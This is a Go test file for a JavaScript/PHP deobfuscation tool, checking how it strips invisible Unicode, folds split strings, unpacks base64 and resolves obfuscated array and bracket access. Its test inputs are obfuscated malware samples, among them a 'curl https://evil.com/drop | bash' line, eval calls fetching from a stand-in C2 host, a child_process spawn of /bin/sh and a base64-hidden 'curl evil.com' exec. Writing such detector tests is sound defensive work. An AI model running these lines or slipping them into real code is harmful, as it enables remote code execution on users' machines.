package deobfuscate

import (
	"strings"
	"testing"
)

func TestStripInvisibleUnicode(t *testing.T) {
	// Attacker hiding "curl" inside "cu\u200Brl"
	obfuscated := "cu\u200Brl https://evil.com/drop | b\uFEFFash"
	cleaned := StripInvisibleUnicode(obfuscated)
	want := "curl https://evil.com/drop | bash"
	if cleaned != want {
		t.Fatalf("StripInvisibleUnicode() = %q, want %q", cleaned, want)
	}
}

func TestFoldStringConstants(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  string
	}{
		{
			name:  "double-quote concat",
			input: `const cmd = "cu" + "rl " + "evil.com";`,
			want:  `const cmd = "curl evil.com";`,
		},
		{
			name:  "single-quote concat",
			input: `const fn = 'ev' + 'al';`,
			want:  `const fn = 'eval';`,
		},
		{
			name:  "hex escapes",
			input: `const str = "\x63\x75\x72\x6c";`,
			want:  `const str = "curl";`,
		},
		{
			name:  "fromCharCode",
			input: `const c = String.fromCharCode(99, 117, 114, 108);`,
			want:  `const c = "curl";`,
		},
		{
			name:  "array join",
			input: `const a = ['c', 'u', 'r', 'l'].join('');`,
			want:  `const a = "curl";`,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := FoldStringConstants(tt.input)
			if got != tt.want {
				t.Fatalf("FoldStringConstants(%q) = %q, want %q", tt.input, got, tt.want)
			}
		})
	}
}

func TestUnpackBase64Payloads(t *testing.T) {
	// Base64 for: var net = require('net');
	encoded := "dmFyIG5ldCA9IHJlcXVpcmUoJ25ldCcpOw=="
	script := `eval(Buffer.from("` + encoded + `", "base64").toString());`

	normalized, decoded := UnpackBase64Payloads(script)
	if len(decoded) != 1 {
		t.Fatalf("expected 1 decoded payload, got %d", len(decoded))
	}
	if decoded[0] != "var net = require('net');" {
		t.Fatalf("unexpected decoded payload: %q", decoded[0])
	}
	if !strings.Contains(normalized, "var net = require('net');") {
		t.Fatalf("normalized script missing decoded block: %s", normalized)
	}
}

func TestUnpackBase64_IgnoresStaticAssets(t *testing.T) {
	// Base64 for: <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16"><circle cx="8" cy="8" r="8"/></svg>
	svgBase64 := "PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgaGVpZ2h0PSIxNiI+PGNpcmNsZSBjeD0iOCIgY3k9IjgiIHI9IjgiLz48L3N2Zz4="
	minifiedCode := `const icon = "data:image/svg+xml;base64,` + svgBase64 + `";`

	_, decoded := UnpackBase64Payloads(minifiedCode)
	if len(decoded) != 0 {
		t.Fatalf("expected 0 decoded payloads for inlined SVG asset, got %d: %v", len(decoded), decoded)
	}
}

func TestNormalizePipeline(t *testing.T) {
	// Combines zero-width space, split strings, and base64
	input := "const payload = \"dm\u200bFyIG5ldCA9IHJlcXVpcmUoJ25ldCcpOw==\";\n" +
		"const act\u200bion = 'ev' + 'al';\n" +
		"globalThis[action](Buffer.from(payload, \"base64\").toString());\n"

	res := Normalize(input)
	if !res.HadUnicodeTrap {
		t.Fatal("expected HadUnicodeTrap = true")
	}
	if !res.HadStringConcat {
		t.Fatal("expected HadStringConcat = true")
	}
	if len(res.DecodedPayloads) != 1 {
		t.Fatalf("expected 1 decoded payload, got %d", len(res.DecodedPayloads))
	}
	if !strings.Contains(res.NormalizedCode, "eval") {
		t.Fatalf("expected normalized code to contain 'eval', got:\n%s", res.NormalizedCode)
	}
}

func TestDetectXORLoop(t *testing.T) {
	phpXOR := `$data[$i] = chr(ord($data[$i]) ^ ord($key[$i % strlen($key)]));`
	if !DetectXORLoop(phpXOR) {
		t.Errorf("expected DetectXORLoop = true for PHP XOR loop")
	}

	jsXOR := `const c = data.charCodeAt(i) ^ key.charCodeAt(i % key.length);`
	if !DetectXORLoop(jsXOR) {
		t.Errorf("expected DetectXORLoop = true for JS XOR loop")
	}

	cleanCode := `const x = a + b; return x * 2;`
	if DetectXORLoop(cleanCode) {
		t.Errorf("expected DetectXORLoop = false for clean code")
	}
}

func TestResolveStringArrays(t *testing.T) {
	input := `
var _0xabc = ['eval', 'child_process', 'spawn', 'https://c2.xyz/drop'];
window[_0xabc[0]](_0xabc[0x3]);
const req = require(_0xabc[1]);
req[_0xabc[2]]('/bin/sh');
`
	res, changed := ResolveStringArrays(input)
	if !changed {
		t.Fatal("expected ResolveStringArrays changed = true")
	}
	if !strings.Contains(res, `window['eval']('https://c2.xyz/drop')`) {
		t.Errorf("expected resolved window['eval'], got:\n%s", res)
	}
	if !strings.Contains(res, `require('child_process')`) {
		t.Errorf("expected resolved require('child_process'), got:\n%s", res)
	}
}

func TestNormalizeBracketAccess(t *testing.T) {
	input := `
window['eval']('malicious()');
process['env']['AWS_SECRET_ACCESS_KEY'] = 'stolen';
globalThis['require']('net');
`
	res, changed := NormalizeBracketAccess(input)
	if !changed {
		t.Fatal("expected NormalizeBracketAccess changed = true")
	}
	if !strings.Contains(res, `window.eval('malicious()')`) {
		t.Errorf("expected window.eval, got:\n%s", res)
	}
	if !strings.Contains(res, `process.env.AWS_SECRET_ACCESS_KEY`) {
		t.Errorf("expected process.env.AWS_SECRET_ACCESS_KEY, got:\n%s", res)
	}
	if !strings.Contains(res, `globalThis.require('net')`) {
		t.Errorf("expected globalThis.require('net'), got:\n%s", res)
	}
}

func TestUnpackBase64_CommentAndTemplateStrings(t *testing.T) {
	// Base64 for: require('child_process').exec('curl evil.com');
	b64Payload := "cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2N1cmwgZXZpbC5jb20nKTs="

	// 1. Comment block payload
	commentScript := `
/* ` + b64Payload + ` */
function normalCode() { return 42; }
`
	_, decoded1 := UnpackBase64Payloads(commentScript)
	if len(decoded1) != 1 || !strings.Contains(decoded1[0], "child_process") {
		t.Fatalf("expected comment block payload extracted, got: %v", decoded1)
	}

	// 2. Template string payload
	templateScript := "const tpl = `" + b64Payload + "`;\n"
	_, decoded2 := UnpackBase64Payloads(templateScript)
	if len(decoded2) != 1 || !strings.Contains(decoded2[0], "child_process") {
		t.Fatalf("expected template string payload extracted, got: %v", decoded2)
	}
}
